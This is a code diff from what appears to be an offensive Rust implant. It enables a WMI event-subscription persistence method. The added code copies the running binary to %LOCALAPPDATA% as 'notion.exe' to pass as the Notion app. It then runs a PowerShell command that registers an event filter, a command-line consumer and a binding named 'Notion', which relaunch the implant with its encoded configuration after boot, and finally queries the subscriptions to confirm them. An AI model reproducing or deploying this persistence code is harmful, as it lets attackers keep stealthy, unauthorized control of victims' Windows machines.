@@ -8,6 +8,9 @@ use is_root::is_root;
 #[cfg(windows)] use std::fs::copy as fs_copy;
 #[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
 use crate::config::ConfigOptions;
+use std::process::Command;
+use crate::cmd::getprivs::is_elevated;
+
 
 /// Uses the specified method to establish persistence. 
 /// 
@@ -66,45 +69,60 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                 //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
                 //With special thanks to: https://github.com/trickster0/OffensiveRust
                 //OPSEC unsafe! Use with caution
-                // under construction
-                /*
-    
-                if let Ok(v) = var("LOCALAPPDATA") {
-                let mut persist_path: String = v;
-                persist_path.push_str(r"\notion.exe");
-                let exe_path = args().nth(0).unwrap();
-                println!("{exe_path}");
-                // let mut out_file = File::create(path).expect("Failed to create file");
-                fs_copy(&exe_path, &persist_path)?;
-    
-                // I basically hate this, but...
+                let elevated = is_elevated();
+                if elevated {
+                    if let Ok(v) = var("LOCALAPPDATA") {
+                        let mut persist_path: String = v;
+                        persist_path.push_str(r"\notion.exe");
+                        let exe_path = args().nth(0).unwrap();
+                        match fs_copy(&exe_path, &persist_path) {
+                            Ok(_)  => {
+                                
+                                let encoded_config = config_options.to_base64();
+                                let cmds = vec![
+                                    format!(r#"$FilterArgs = @{{ name='Notion';EventNameSpace='root\CimV2';QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{{ name='Notion';CommandLineTemplate="{persist_path} -b {encoded_config}"; }}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs ; $FilterToConsumerArgs = @{{ Filter = [Ref] $Filter; Consumer = [Ref] $Consumer ;}}; $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs"#),
+                                    ];
+
+                                for c in cmds {
+                                    println!("Arg: {c}");
+                                    Command::new("powershell.exe")
+                                    .arg(c)
+                                    .spawn()?;
+                                };
+                                    
+                                let sleep_time = 
+                                std::time::Duration::from_secs(2);
+                                std::thread::sleep(sleep_time);
+
+                                // Checking the subscriptions:
+                                let output = Command::new("powershell.exe")
+                                    .arg(r"Get-WMIObject -Namespace root\Subscription -Class __EventFilter ")
+                                    .output()
+                                    .expect("failed to execute process");
+                            
+                                    let output_string: String;
+                                    if output.stderr.len() > 0 {
+                                        output_string = String::from_utf8(output.stderr).unwrap();
+                                    } else {
+                                        output_string = String::from_utf8(output.stdout).unwrap();
+                                    }
+                                    return Ok(output_string);
+                            },
+                            Err(e) => { return Ok(e.to_string())}
+                        }
                 
-                let args1 = r##"/c wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Notion", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"##;
-                let args2 = format!(r##"/c wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Notion", ExecutablePath="{persist_path}",CommandLineTemplate="{persist_path}"##);
-                let args3 = r##"/c wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Notion\"", Consumer="CommandLineEventConsumer.Name=\"Notion\"""##;
-                
-                let cmd1 =  { Command::new("cmd")
-                        .args([args1])
-                        .output()
-                        .expect("failed to execute process");
-                };
-                let cmd2 =  { Command::new("cmd")
-                        .args([args2])
-                        .output()
-                        .expect("failed to execute process");
-                };
-                let cmd3 =  { Command::new("cmd")
-                        .args([args3])
-                        .output()
-                        .expect("failed to execute process")
-                };
-                */
-                Ok("Under Construction".to_string())
-                
+                    } else {
+                        return Ok("Could not locate APPDATA.".to_string());
+                    }
+                }
+                else{
+                    return Ok("[-] WMIC persistence requires admin privileges.".to_string());
+                }
             },
             _ => Ok("That's not a persistence method!".to_string())
         }
     }
+
     #[cfg(not(windows))] {
 
         let app_path = args().nth(0).unwrap();
